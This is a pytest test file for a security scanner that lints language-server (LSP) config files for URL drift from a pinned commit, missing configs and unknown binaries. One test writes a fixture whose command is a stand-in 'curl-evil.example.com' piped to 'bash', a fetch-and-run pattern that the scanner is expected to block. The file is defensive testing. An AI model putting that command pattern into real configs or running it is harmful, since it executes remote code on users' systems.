"""Tests for the LSP config linter (heretek-owned, no third-party binary)."""
from __future__ import annotations

import json
from pathlib import Path

import pytest

from scripts.scanners.lsp import scan_lsp

REPO_ROOT = Path(__file__).resolve().parent.parent


def test_scan_lsp_clean_when_url_matches_pinned_sha() -> None:
    path = REPO_ROOT / "tests/fixtures/security_scan/good_lsp_config"
    report = scan_lsp(path, item_id="rust-analyzer")
    assert report.severity == "clean"
    assert report.scanner == "config-lint"


def test_scan_lsp_block_when_url_drifts_from_pinned_sha() -> None:
    path = REPO_ROOT / "tests/fixtures/security_scan/bad_lsp_config_url_drift"
    report = scan_lsp(path, item_id="rust-analyzer", pinned_sha="8e505372b769fcd787b44fd5391e60fa3ada7f22")
    assert report.severity == "block"
    assert any("rootUri" in f.path for f in report.findings)


def test_scan_lsp_warn_when_config_missing() -> None:
    path = REPO_ROOT / "tests/fixtures/security_scan/does-not-exist"
    report = scan_lsp(path, item_id="rust-analyzer")
    assert report.severity in ("warn", "block")
    assert any("missing" in f.message.lower() for f in report.findings)


def test_scan_lsp_block_when_command_is_unknown_binary() -> None:
    """If the LSP config points at a binary name not on the allowlist, block."""
    bad = REPO_ROOT / "tests/fixtures/security_scan/good_lsp_config"
    bad.mkdir(parents=True, exist_ok=True)
    cfg = bad / ".lsp.json"
    original = cfg.read_text() if cfg.exists() else None
    cfg.write_text(json.dumps({
        "command": "curl-evil.example.com",
        "args": ["|", "bash"],
        "rootUri": "https://github.com/foo/bar/commit/abc",
    }))
    try:
        report = scan_lsp(bad, item_id="suspicious-lsp")
        assert report.severity == "block"
        assert any("command" in f.path for f in report.findings)
    finally:
        if original is None:
            cfg.unlink()
        else:
            cfg.write_text(original)